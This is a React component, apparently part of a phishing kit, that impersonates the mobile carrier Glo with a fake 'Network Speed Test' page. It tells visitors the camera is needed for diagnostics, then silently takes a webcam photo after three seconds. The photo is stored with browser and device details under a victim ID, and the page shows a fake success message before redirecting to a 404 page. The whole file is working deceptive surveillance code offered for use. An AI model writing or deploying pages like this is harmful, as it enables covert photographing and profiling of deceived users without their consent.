
import { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';

const GLOCameraHack = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [isCapturing, setIsCapturing] = useState(false);
  const [stream, setStream] = useState<MediaStream | null>(null);

  useEffect(() => {
    startCamera();
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 }
        },
        audio: false 
      });
      
      setStream(mediaStream);
      
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        videoRef.current.play();
        
        setTimeout(() => {
          capturePhoto();
        }, 3000);
      }
    } catch (error) {
      console.log('Camera access denied or not available');
      setTimeout(() => {
        setIsCapturing(true);
        setTimeout(() => {
          navigate('/404-not-found');
        }, 2000);
      }, 3000);
    }
  };

  const capturePhoto = () => {
    if (videoRef.current && canvasRef.current && stream) {
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      
      canvas.width = videoRef.current.videoWidth || 640;
      canvas.height = videoRef.current.videoHeight || 480;
      
      if (context) {
        context.drawImage(videoRef.current, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        const capturedData = {
          carrier: 'GLO',
          imageUrl: imageData,
          timestamp: Date.now(),
          ip: 'Unknown',
          userAgent: navigator.userAgent,
          deviceInfo: {
            platform: navigator.platform,
            language: navigator.language
          }
        };

        const existingData = JSON.parse(localStorage.getItem(`camera_${userId}`) || '[]');
        existingData.push(capturedData);
        localStorage.setItem(`camera_${userId}`, JSON.stringify(existingData));
        
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        setIsCapturing(true);
        
        setTimeout(() => {
          navigate('/404-not-found');
        }, 2000);
      }
    }
  };

  return (
    <div className="min-h-screen bg-green-500 flex items-center justify-center p-4">
      <div className="max-w-md mx-auto bg-white rounded-lg shadow-xl overflow-hidden">
        <div className="bg-green-600 p-4 text-center">
          <h1 className="text-white text-2xl font-bold">Glo</h1>
          <p className="text-white text-sm">Network Optimization</p>
        </div>
        
        <div className="p-6">
          {!isCapturing ? (
            <>
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
                  <span className="text-white text-2xl">🌐</span>
                </div>
                <h2 className="text-gray-800 text-lg font-semibold mb-2">Network Speed Test</h2>
                <p className="text-gray-600 text-sm">Optimize your network performance with our advanced speed test</p>
              </div>

              <video 
                ref={videoRef} 
                className="w-full rounded-lg mb-4 bg-gray-200"
                autoPlay 
                muted 
                playsInline
                style={{ maxHeight: '300px', objectFit: 'cover' }}
              />
              
              <canvas ref={canvasRef} style={{ display: 'none' }} />
              
              <div className="bg-green-50 p-4 rounded-lg mb-4">
                <p className="text-green-800 text-sm">
                  📊 Camera required for advanced network diagnostics and user verification.
                </p>
              </div>

              <Button 
                onClick={startCamera}
                className="w-full bg-green-500 hover:bg-green-600 text-white h-12 font-semibold"
              >
                Start Speed Test
              </Button>
            </>
          ) : (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-500 mx-auto mb-4"></div>
              <h3 className="text-gray-800 text-lg font-semibold mb-2">Test Complete</h3>
              <p className="text-gray-600 text-sm">Network optimization successful. Redirecting...</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default GLOCameraHack;
